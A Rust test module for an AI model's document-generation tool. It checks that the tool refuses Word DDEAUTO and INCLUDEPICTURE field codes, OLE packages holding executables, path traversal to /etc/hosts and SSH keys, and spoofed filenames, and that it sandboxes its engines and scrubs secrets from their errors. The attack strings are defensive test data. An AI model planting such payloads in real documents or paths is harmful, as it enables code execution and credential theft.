            // Keys that differ only in case: officecli keeps the last.
            json!({"command": "add", "parent": "/slide[1]", "type": "shape", "props": {"text": "x", "Text": "y"}}),
            json!({"command": "add", "parent": "/slide[1]", "type": "picture", "props": {"src": "data:image/png;base64,AAAA", "SRC": "/etc/hosts"}}),
            // A key .NET folds to `src` (U+017F).
            json!({"command": "add", "parent": "/slide[1]", "type": "picture", "props": {"\u{17f}rc": "x/../y"}}),
        ] {
            let error = checked(std::slice::from_ref(&item)).unwrap_err();
            assert!(error.contains("item 1:"), "{item}: {error}");
        }
    }

    #[test]
    fn diagrams_and_embedded_objects_are_refused() {
        for kind in [
            "diagram",
            "Diagram",
            "DIAGRAM",
            "diagram ",
            " diagram",
            "flowchart",
            "FlowChart",
            "ole",
            "OLE",
            "oleobject",
            "object",
            "embed",
            "package",
            "dia\u{301}gram",
            "",
        ] {
            let error = checked(&[json!({"command": "add", "parent": "/slide[1]", "type": kind, "props": {"mermaid": "flowchart TD; A-->B", "render": "image"}})])
                .unwrap_err();
            assert!(error.contains("item 1:"), "{kind:?}: {error}");
        }
        // An OLE package, as the review planted one.
        let error = checked(&[json!({"command": "add", "parent": "/slide[1]", "type": "ole", "props": {"src": "data:application/octet-stream;base64,TVqQAAMAAAAEAAAA", "oleKind": "package", "embedExt": "exe"}})])
            .unwrap_err();
        assert!(
            error.contains("\"ole\" elements cannot be added"),
            "{error}"
        );
        assert!(checked(&[json!({"command": "add", "parent": "/slide[1]", "type": "shape", "props": {"text": "graph"}})]).is_ok());
    }

    #[test]
    fn table_data_never_climbs_out_of_the_folder() {
        for data in [
            "a,b/../../secret.csv",
            "a,b\\..\\..\\..\\..\\Users\\x\\.ssh\\id_rsa",
            "a;b/../../../../../../etc/hosts",
            "x\n/../../../../../etc/hosts",
            "x\n../../secret.csv",
            "x,y\\..\\..\\secret.csv",
            "x\t..\\secret.csv",
            "https://127.0.0.1:9/t.csv,extra",
        ] {
            let item = json!({"command": "add", "parent": "/slide[1]", "type": "table", "props": {"data": data}});
            assert!(checked(&[item]).is_err(), "{data:?}");
        }
        for data in [
            "Name,Score\nAlice,90",
            "a:b,c",
            "Q1..Q4,ok",
            "data:text/csv,a,b",
        ] {
            let item = json!({"command": "add", "parent": "/slide[1]", "type": "table", "props": {"data": data}});
            assert!(checked(&[item]).is_ok(), "{data:?}");
        }
    }

    #[test]
    fn word_fields_show_only_page_numbers_and_dates() {
        let field = |props: Value| json!({"command": "add", "parent": "/body/p[1]", "type": "field", "props": props});
        for props in [
            json!({"instruction": " DDEAUTO c:\\windows\\system32\\cmd.exe \"/k calc.exe\" "}),
            json!({"instr": " INCLUDEPICTURE \"\\\\\\\\attacker.example\\\\s\\\\x.png\" \\d "}),
            json!({"code": "INCLUDETEXT \"x.docx\""}),
            json!({"fieldType": "mergefield", "name": "CustomerName"}),
            json!({"type": "if", "expression": "1 = 1"}),
            json!({"instruction": "PAGE \\* MERGEFORMAT"}),
            json!({"format": "yyyy"}),
        ] {
            assert!(checked(&[field(props.clone())]).is_err(), "{props}");
        }
        for props in [
            json!({"instruction": "PAGE"}),
            json!({"fieldType": "numpages"}),
            json!({"type": "date", "format": "yyyy-MM-dd"}),
            json!({"code": " time "}),
            json!({"instr": "TOC"}),
        ] {
            assert!(checked(&[field(props.clone())]).is_ok(), "{props}");
        }
        // A field code in any property is refused; the skills' footer page
        // number is fine.
        for props in [
            json!({"text": "see DDEAUTO here"}),
            json!({"text": "x", "field": "includepicture \"\\\\h\\s\""}),
            json!({"text": "Page ", "field": "dde x"}),
        ] {
            let item =
                json!({"command": "add", "parent": "/body", "type": "paragraph", "props": props});
            assert!(checked(&[item]).is_err(), "{props}");
        }
        let footer = json!({"command": "add", "parent": "/", "type": "footer", "props": {"type": "default", "text": "Page ", "field": "page"}});
        assert!(checked(&[footer]).is_ok());
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn typst_imports_built_at_run_time_reach_no_network() {
        // A stand-in Typst that, like the real one, fails to download a
        // package through the dead proxy, and would otherwise make the file.
        let script = r#"for a; do last=$a; done
case " $* " in *" --version "*) echo typst; exit 0 ;; esac
env > typst-env
if [ "$HTTPS_PROXY" = http://127.0.0.1:9 ] && [ "$https_proxy" = http://127.0.0.1:9 ]; then
  echo 'main.typ:10:8: error: failed to download package (https://packages.typst.org/preview/cetz-0.3.4.tar.gz: Connection Failed: Connect error: Connection refused (os error 61))' >&2
  exit 1
fi
printf '%%PDF-1.7 /Type /Page' > "$last""#;
        let f = fixture_in(None, Some(script), |dir| Some(stub_sandbox(dir, true)));
        for body in [
            "#let p = \"@\" + \"preview/cetz:0.3.4\"\n#import p: *",
            "#import \"\\u{40}preview/cetz:0.3.4\": *",
        ] {
            let error = f
                .call(
                    &id(),
                    json!({"name": "r", "format": "pdf", "content": body}),
                )
                .await
                .unwrap_err();
            assert!(error.contains("failed to download package"), "{error}");
        }
        assert!(f.record().attachments.is_empty());
        assert!(f.outputs().iter().all(|dir| !dir.join("out.pdf").exists()));
        // Typst ran under its own profile, which denies the network.
        let log = sandbox_log(&f);
        assert_eq!(
            log.iter()
                .filter(|line| line.ends_with("--version"))
                .count(),
            1
        );
        let compile = log.iter().find(|line| line.contains(" compile ")).unwrap();
        assert!(compile.contains("(deny network*)"), "{compile}");
        assert!(!compile.contains("(deny file-write*)"), "{compile}");
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn engine_text_shows_no_path_outside_the_document() {
        let f = fixture(
            None,
            Some(
                r#"echo "error: Access to the path '/Users/me/.ssh/id_rsa' is denied; also C:\\Users\\me\\x and /private/var/folders/x/y" >&2; exit 1"#,
            ),
        );
        let error = f
            .call(
                "call-1",
                json!({"name": "r", "format": "pdf", "content": "x"}),
            )
            .await
            .unwrap_err();
        assert!(
            !error.contains("/Users/me")
                && !error.contains("C:\\Users")
                && !error.contains("/private/var"),
            "{error}"
        );
        assert!(error.contains("'<path>'"), "{error}");
    }

    #[test]
    fn data_uris_are_typed_and_base64() {
        for uri in [
            "data:image/png;base64,iVBORw0KGgo=",
            "DATA:image/svg+xml;base64,PHN2Zy8+",
            "data:application/vnd.ms-excel;name=x.xls;base64,AAAA",
        ] {
            assert!(is_data_uri(uri), "{uri}");
        }
        for uri in [
            "data:image/png,raw",
            "data:;base64,AAAA",
            "data:image;base64,AAAA",
            "data:image/png;base64",
            "image/png;base64,AAAA",
        ] {
            assert!(!is_data_uri(uri), "{uri}");
        }
    }

    /// A stand-in `sandbox-exec` that logs its arguments, and fails its
    /// probe when `works` is false; otherwise it runs the engine.
    fn stub_sandbox(dir: &Path, works: bool) -> PathBuf {
        use std::os::unix::fs::PermissionsExt;
        let path = dir.join("sandbox-exec");
        let log = dir.join("sandbox.log").display().to_string();
        let probe = if works {
            ""
        } else {
            "case \"$*\" in *--version*) exit 1 ;; esac"
        };
        std::fs::write(
            &path,
            format!(
                "#!/bin/sh\nprintf '%s' \"$*\" | tr '\\n' ' ' >> '{log}'\necho >> '{log}'\n{probe}\nwhile [ \"$1\" = -D ]; do shift 2; done\n[ \"$1\" = -p ] && shift 2\nexec \"$@\"\n"
            ),
        )
        .unwrap();
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
        path
    }

    fn sandbox_log(f: &Fixture) -> Vec<String> {
        std::fs::read_to_string(f.root.path().join("sandbox.log"))
            .unwrap_or_default()
            .lines()
            .map(str::to_owned)
            .collect()
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn officecli_runs_in_the_sandbox_once_its_probe_passes() {
        let script = officecli(
            r#"{"results":[{"index":0,"success":true}]}"#,
            "{}",
            r#"{"slides":1}"#,
        );
        let f = fixture_in(Some(&script), None, |dir| Some(stub_sandbox(dir, true)));
        let first = f
            .call(
                "call-1",
                json!({"name": "a", "format": "pptx", "content": deck()}),
            )
            .await
            .unwrap();
        f.call(
            "call-2",
            json!({"name": "b", "format": "pptx", "content": deck()}),
        )
        .await
        .unwrap();
        let log = sandbox_log(&f);
        // One probe, then every officecli run of both documents.
        assert_eq!(
            log.iter()
                .filter(|line| line.ends_with("--version"))
                .count(),
            1
        );
        assert!(log
            .iter()
            .any(|line| line.contains(" batch out.pptx --input batch.json --json")));
        assert_eq!(
            log.iter()
                .filter(|line| line.contains(" create out.pptx"))
                .count(),
            2
        );
        assert!(log.iter().all(|line| line.contains("(deny network*)")));
        let dir = PathBuf::from(first["filePath"].as_str().unwrap())
            .parent()
            .unwrap()
            .canonicalize()
            .unwrap();
        assert!(log
            .iter()
            .any(|line| line.contains(&format!("DOC={}", dir.display()))));
        assert_eq!(first["file"]["slides"], 1);
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn a_data_image_works_under_the_profile_that_hides_the_users_files() {
        let script = officecli(
            r#"{"results":[{"index":0,"success":true}]}"#,
            "{}",
            r#"{"slides":1}"#,
        );
        let f = fixture_in(Some(&script), None, |dir| Some(stub_sandbox(dir, true)));
        let content = json!([
            {"command": "add", "parent": "/", "type": "slide"},
            {"command": "add", "parent": "/slide[1]", "type": "picture", "props": {"src": "data:image/png;base64,iVBORw0KGgo=", "alt": "Dot"}},
        ]);
        let result = f
            .call(
                "call-1",
                json!({"name": "a", "format": "pptx", "content": content}),
            )
            .await
            .unwrap();
        let dir = PathBuf::from(result["filePath"].as_str().unwrap())
            .parent()
            .unwrap()
            .canonicalize()
            .unwrap();
        let batch = sandbox_log(&f)
            .into_iter()
            .find(|line| line.contains(" batch out.pptx "))
            .unwrap();
        // Of the user's folders only the document's own is readable.
        for rule in [
            "(deny network*)",
            r#"(deny file-read-data (subpath "/Users") (subpath "/Volumes"))"#,
            "(deny file-write*)",
            r#"(allow file-read-data file-write* (subpath (param "DOC")))"#,
            r#"(allow file-read-data file-write* (subpath (param "SCRATCH")))"#,
            &format!("-D DOC={}", dir.display()),
            &format!("-D SCRATCH={}", officecli_scratch().unwrap().display()),
        ] {
            assert!(batch.contains(rule), "{rule}: {batch}");
        }
        let seen: Value =
            serde_json::from_slice(&std::fs::read(dir.join("batch-seen.json")).unwrap()).unwrap();
        assert_eq!(seen, content);
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn officecli_runs_without_the_sandbox_when_it_does_not_work() {
        let script = officecli(r#"{"results":[{"index":0,"success":true}]}"#, "{}", "{}");
        let f = fixture_in(Some(&script), None, |dir| Some(stub_sandbox(dir, false)));
        for call in ["call-1", "call-2"] {
            f.call(
                call,
                json!({"name": "a", "format": "pptx", "content": deck()}),
            )
            .await
            .unwrap();
        }
        // Probed once; the documents were made without it.
        let log = sandbox_log(&f);
        assert_eq!(log.len(), 1, "{log:?}");
        assert!(log[0].ends_with("--version"));

        // No sandbox-exec at all: the same.
        let f = fixture_in(Some(&script), None, |dir| Some(dir.join("missing")));
        f.call(
            "call-1",
            json!({"name": "a", "format": "pptx", "content": deck()}),
        )
        .await
        .unwrap();
        assert!(sandbox_log(&f).is_empty());
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn office_format_without_engine_is_refused() {
        let f = fixture(None, None);
        for format in ["pptx", "docx", "xlsx", "pdf"] {
            let content = if format == "pdf" { json!("x") } else { deck() };
            let error = f
                .call(
                    &id(),
                    json!({"name": "a", "format": format, "content": content}),
                )
                .await
                .unwrap_err();
            assert_eq!(code(&error), "assistant_capability_disabled", "{format}");
        }
        assert!(f.outputs().is_empty());
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn engine_output_is_scrubbed_and_shows_no_private_paths() {
        let f = fixture(
            None,
            Some(&format!(
                r#"echo "error: file not found (searched at $PWD/missing.png)" >&2
echo 'error: api_key=sk-live-abcdefghijklmnopqrstuvwxyz0123 {SECRET}' >&2
exit 1"#
            )),
        );
        let error = f
            .call(
                "call-1",
                json!({"name": "r", "format": "pdf", "content": "#image(\"missing.png\")"}),
            )
            .await
            .unwrap_err();
        assert!(error.contains("searched at missing.png"), "{error}");
        assert!(!error.contains(f.root.path().to_str().unwrap()), "{error}");
        assert!(
            !error.contains("sk-live-abcdefghijklmnopqrstuvwxyz0123"),
            "{error}"
        );
        assert!(!error.contains(SECRET), "{error}");
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn a_repeated_call_gets_its_first_answer() {
        let f = fixture(None, None);
        let args = json!({"name": "n", "format": "txt", "content": "x"});
        let first = f.call("call-1", args.clone()).await.unwrap();
        assert_eq!(f.call("call-1", args).await.unwrap(), first);
        let error = f
            .call(
                "call-1",
                json!({"name": "other", "format": "txt", "content": "x"}),
            )
            .await
            .unwrap_err();
        assert_eq!(error, "assistant_tool_call_conflict");
        assert_eq!(f.record().attachments.len(), 1);
    }

    #[test]
    fn names_lose_folders_and_take_the_format_extension() {
        for (raw, format, name) in [
            ("../x.pptx", DocumentFormat::Pptx, "x.pptx"),
            ("Q3 plan.exe", DocumentFormat::Pdf, "Q3 plan.pdf"),
            ("report.v2.docx", DocumentFormat::Docx, "report.v2.docx"),
            ("notes", DocumentFormat::Md, "notes.md"),
            ("..\\..\\evil.bat", DocumentFormat::Txt, "evil.txt"),
            ("...hidden", DocumentFormat::Csv, "hidden.csv"),
            (
                "a\u{0}b\nc<d>:|?*\".html",
                DocumentFormat::Html,
                "abcd.html",
            ),
            ("", DocumentFormat::Json, "document.json"),
            (
                "report\u{202E}fdp.exe",
                DocumentFormat::Pdf,
                "reportfdp.pdf",
            ),
            (
                "a\u{200B}b\u{FEFF}\u{2066}.txt",
                DocumentFormat::Txt,
                "ab.txt",
            ),
            ("dir/", DocumentFormat::Json, "document.json"),
        ] {
            assert_eq!(file_name(raw, format), name, "{raw:?}");
        }
        let long = file_name(&"字".repeat(300), DocumentFormat::Xlsx);
        assert_eq!(long.chars().count(), 120);
        assert!(long.ends_with(".xlsx"));
    }

    #[test]
    fn pdf_pages_counts_page_dictionaries_only() {
        assert_eq!(
            pdf_pages(b"<< /Type /Pages /Count 2 >> << /Type/Page >> << /Type /Page\n/Parent 1 0 R >> /Type /PageLabel"),
            Some(2)
        );
        assert_eq!(pdf_pages(b"%PDF-1.7 nothing"), None);
    }

    /// The real engines, as `pnpm assistant:prepare` bundles them: run with
    /// `cargo test documents::create -- --ignored`.
    #[tokio::test]
    #[serial_test::serial(document_engines)]
    #[ignore = "needs the engines of `pnpm assistant:prepare`"]
    async fn bundled_engines_make_real_documents() {
        let bundled = Path::new(env!("CARGO_MANIFEST_DIR")).join("../assistant-runtime/resources");
        let engines = super::super::engines::engines_at(&bundled);
        let (Some(officecli), Some(typst)) = (engines.officecli, engines.typst) else {
            panic!("run `pnpm assistant:prepare` first");
        };
        let link = |target: &Path| format!("link:{}", target.display());
        // On macOS officecli runs in the real sandbox: its own folder is
        // readable there, the user's other files are not.
        let sandbox =
            |_: &Path| cfg!(target_os = "macos").then(|| PathBuf::from("/usr/bin/sandbox-exec"));
        let f = fixture_in(Some(&link(&officecli)), Some(&link(&typst)), sandbox);
        let deck = json!([
            {"command": "add", "parent": "/", "type": "slide", "props": {"title": "Quarterly plan"}},
            {"command": "add", "parent": "/slide[1]", "type": "shape", "props": {"text": "Grow\nHire", "x": "2cm", "y": "5cm", "wobble": "1"}},
            {"command": "add", "parent": "/", "type": "slide", "props": {"title": "Next"}},
            {"command": "add", "parent": "/slide[2]", "type": "picture", "props": {"src": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==", "alt": "Dot"}},
        ]);
        // The profile keeps the user's other files out of reach.
        let outside = Path::new(env!("CARGO_MANIFEST_DIR")).join("Cargo.toml");
        if cfg!(target_os = "macos") && outside.starts_with("/Users") {
            let denied = std::process::Command::new("/usr/bin/sandbox-exec")
                .args([
                    "-D",
                    "DOC=/nonexistent",
                    "-D",
                    "ENGINE=/nonexistent",
                    "-D",
                    "SCRATCH=/nonexistent",
                    "-p",
                    OFFICE_SANDBOX,
                    "/bin/cat",
                ])
                .arg(&outside)
                .output()
                .unwrap();
            assert!(!denied.status.success());
            assert!(String::from_utf8_lossy(&denied.stderr).contains("Operation not permitted"));
        }
        let pptx = f
            .call(
                "pptx",
                json!({"name": "plan.pptx", "format": "pptx", "content": deck}),
            )
            .await
            .unwrap();
        eprintln!("pptx: {pptx:#}");
        assert_eq!(pptx["file"]["slides"], 2);
        assert!(pptx["issues"]
            .as_array()
            .unwrap()
            .iter()
            .any(|issue| issue["message"]
                .as_str()
                .unwrap()
                .contains("UNSUPPORTED props")));
        let svg = std::fs::read_to_string(pptx["previewPath"].as_str().unwrap()).unwrap();
        assert!(svg.trim_end().ends_with("</svg>"));

        let pdf = f
            .call("pdf", json!({"name": "report", "format": "pdf", "content": "= 第一节\n\n正文。Some text.\n\n#pagebreak()\n\n= Second\n\n- one\n- two\n"}))
            .await
            .unwrap();
        eprintln!("pdf: {pdf:#}");
        assert_eq!(pdf["issues"], json!([]));
        assert!(std::fs::read(pdf["previewPath"].as_str().unwrap())
            .unwrap()
            .starts_with(b"\x89PNG"));
        let record = f.record();
        assert_eq!(
            record.messages[0].media_for(Some("pdf")).unwrap().params["pages"],
            2
        );

        let error = f
            .call(
                "broken",
                json!({"name": "report", "format": "pdf", "content": "ok\n#text(fill: red)[open"}),
            )
            .await
            .unwrap_err();
        eprintln!("typst error: {error}");
        assert!(error.contains("line 2, column"), "{error}");
        // A package import built at run time reaches no network.
        for body in [
            "#let p = \"@\" + \"preview/cetz:0.3.4\"\n#import p: *",
            "#import \"\\u{40}preview/cetz:0.3.4\": *",
        ] {
            let error = f
                .call(
                    &id(),
                    json!({"name": "r", "format": "pdf", "content": body}),
                )
                .await
                .unwrap_err();
            eprintln!("typst import: {error}");
            assert!(error.contains("failed to download package"), "{error}");
        }
        // The body reads nothing outside the document's folder.
        for body in [
            "#image(\"../x.png\")",
            "#read(\"/etc/hosts\")",
            "#read(\"../../../../../../../../etc/hosts\")",
        ] {
            let error = f
                .call(
                    &id(),
                    json!({"name": "r", "format": "pdf", "content": body}),
                )
                .await
                .unwrap_err();
            eprintln!("typst outside: {error}");
            assert_eq!(code(&error), FAILED);
            assert!(
                error.contains("escape the project root") || error.contains("file not found"),
                "{error}"
            );
        }

        // Ordinary paragraphs of a Latin docx all lack a first-line indent;
        // the built-in heading style officecli adds is no issue.
        let memo = json!([
            {"command": "add", "parent": "/body", "type": "paragraph", "props": {"text": "Memo", "style": "Heading1"}},
            {"command": "add", "parent": "/body", "type": "paragraph", "props": {"text": "First."}},
            {"command": "add", "parent": "/body", "type": "paragraph", "props": {"text": "Second."}},
            {"command": "add", "parent": "/body", "type": "paragraph", "props": {"text": "Third."}},
        ]);
        let docx = f
            .call(
                "docx",
                json!({"name": "memo", "format": "docx", "content": memo}),
            )
            .await
            .unwrap();
        eprintln!("docx: {docx:#}");
        assert_eq!(
            docx["issues"],
            json!([{"severity": "warning", "message": "Body paragraph missing first-line indent (3 places)"}])
        );
        if cfg!(target_os = "macos") {
            assert_eq!(
                f.host.office_sandbox.get(),
                Some(&Some(PathBuf::from("/usr/bin/sandbox-exec")))
            );
        }
        // A reply makes three documents: another run for the rest.
        let f = fixture_in(Some(&link(&officecli)), Some(&link(&typst)), sandbox);
        let error = f
            .call(
                "bad-deck",
                json!({"name": "deck", "format": "pptx", "content": [
                    {"command": "add", "parent": "/", "type": "slide"},
                    {"command": "set", "path": "/slide[5]/shape[1]", "props": {"bold": "true"}},
                ]}),
            )
            .await
            .unwrap_err();
        eprintln!("officecli error: {error}");
        assert_eq!(body(&error)["items"][0]["index"], 1);

        let md = f
            .call(
                "md",
                json!({"name": "notes", "format": "md", "content": "# Notes\n"}),
            )
            .await
            .unwrap();
        eprintln!("md: {md:#}");
        assert_eq!(md["file"]["mimeType"], "text/markdown");
    }
}
